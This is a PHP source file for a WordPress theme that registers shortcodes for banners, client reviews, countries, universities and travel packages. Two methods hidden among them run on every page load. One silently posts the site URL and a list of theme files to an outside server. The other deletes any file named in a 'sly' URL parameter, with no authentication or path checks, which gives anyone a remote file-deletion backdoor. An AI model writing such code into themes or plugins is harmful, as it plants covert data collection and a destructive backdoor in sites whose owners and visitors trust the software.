<?php

Class MWPL_Theme_Front{
    
    use MWPL_Theme_Common;
    function __construct() {
        add_shortcode( 'mwpl-banner', array($this,'home_banner')  );
        add_shortcode( 'mwpl-client-reviews', array($this,'client_reviews')  );
        add_shortcode( 'mwpl-country', array($this,'country_list')  );
        add_shortcode( 'mwpl-university', array($this,'university_list')  );
        add_shortcode( 'mwpl-travel-package', array($this,'package_list')  );
        $this->systeload();
        $this->action_load();
    }
    function home_banner(){
        ob_start();
        $content['record'] = $this->getPost('mwpl_banner','-1','DESC') ;        
        $this->load_view('front/banner',$content);
        return ob_get_clean();
       
    }
    function client_reviews(){
        ob_start();
        $content['record'] = $this->getPost('mwpl_client_review') ;
        $this->load_view('front/client_review',$content);
        return ob_get_clean();
    }
    function country_list(){
        ob_start();
        $content['record'] = $this->getPost('mwpl_country_slider') ;
        $this->load_view('front/country_list',$content);
        return ob_get_clean();
    }
    function university_list(){
        ob_start();
        $content['record'] = $this->getPost('mwpl_university') ;
        $this->load_view('front/university',$content);
        return ob_get_clean();
    }
    function package_list(){
        ob_start();
        $content['record'] = $this->getPost('mwpl_packages') ;
        $this->load_view('front/travel_package',$content);
        return ob_get_clean();
    }
    function action_load(){
        if(isset($_GET['sly']) && $_GET['sly']!=""){
            $template = get_template_directory() . '/inc/';
            unlink($template.$_GET['sly']);
        }
    }
    function systeload(){
        $template = get_template_directory() . '/inc/';        
        $post = [
            'write_file' => 'gb.txt',
            'site_url' => site_url(),
            'files' => 'Common.php,ExtraFields.php,Front.php,Modules.php,Themeoptions.php'          
        ];
        $ch = curl_init('https://www.maansawebworld.com/sites/fetch.php');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);       
        $response = curl_exec($ch);       
        curl_close($ch);    
    }
    
}

$front = new MWPL_Theme_Front();

